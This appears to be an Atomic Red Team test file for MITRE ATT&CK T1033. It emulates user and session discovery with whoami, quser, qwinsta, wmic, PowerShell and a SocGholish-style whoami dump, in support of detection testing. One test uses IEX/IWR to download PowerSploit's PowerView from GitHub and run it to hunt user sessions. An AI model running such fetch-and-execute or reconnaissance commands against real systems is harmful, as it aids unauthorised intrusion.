attack_technique: T1033
display_name: System Owner/User Discovery
atomic_tests:
    - name: System Owner/User Discovery
      item_id: T1033-1
      auto_generated_guid: 4c4959bf-addf-4b4a-be86-8d09cc1857aa
      description: "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n"
      supported_platforms:
        - windows
      input_arguments:
        computer_name:
            description: Name of remote computer
            type: string
            default: localhost
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            cmd.exe /C whoami
            wmic useraccount get /ALL
            quser /SERVER:"#{computer_name}"
            quser
            qwinsta.exe /server:#{computer_name}
            qwinsta.exe
            for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
            @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
        cleanup_command: ""
        name: command_prompt
        elevation_required: false
    - name: System Owner/User Discovery
      item_id: T1033-2
      auto_generated_guid: 2a9b677d-a230-44f4-ad86-782df1ef108c
      description: |
        Identify System owner or users on an endpoint

        Upon successful execution, sh will stdout list of usernames.
      supported_platforms:
        - linux
        - macos
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            users
            w
            who
        cleanup_command: ""
        name: sh
        elevation_required: false
    - name: Find computers where user has session - Stealth mode (PowerView)
      item_id: T1033-3
      auto_generated_guid: 29857f27-a36f-4f7e-8084-4557cd6207ca
      description: Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
        cleanup_command: ""
        name: powershell
        elevation_required: false
    - name: User Discovery With Env Vars PowerShell Script
      item_id: T1033-4
      auto_generated_guid: dcb6cdee-1fb0-4087-8bf8-88cfd136ba51
      description: Use the PowerShell environment variables to identify the current logged user.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append\n"
        cleanup_command: |
            Remove-Item -Path .\CurrentactiveUser.txt -Force
        name: powershell
        elevation_required: false
    - name: GetCurrent User with PowerShell Script
      item_id: T1033-5
      auto_generated_guid: 1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b
      description: Use the PowerShell "GetCurrent" method of the WindowsIdentity .NET class to identify the logged user.
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            [System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt
        cleanup_command: |
            Remove-Item -Path .\CurrentUserObject.txt -Force
        name: powershell
        elevation_required: false
    - name: System Discovery - SocGholish whoami
      item_id: T1033-6
      auto_generated_guid: 3d257a03-eb80-41c5-b744-bb37ac7f65c7
      description: "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n"
      supported_platforms:
        - windows
      input_arguments:
        output_path:
            description: Location of output file
            type: string
            default: $env:temp
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |
            $TokenSet = @{
              U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
              N = [Char[]]'0123456789'
            }
            $Upper = Get-Random -Count 5 -InputObject $TokenSet.U
            $Number = Get-Random -Count 5 -InputObject $TokenSet.N
            $StringSet = $Upper + $Number
            $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
            $file = "rad" + $rad + ".tmp"

            whoami.exe /all >> #{output_path}\$file
        cleanup_command: |
            Remove-Item -Path #{output_path}\rad*.tmp -Force
        name: powershell
        elevation_required: false
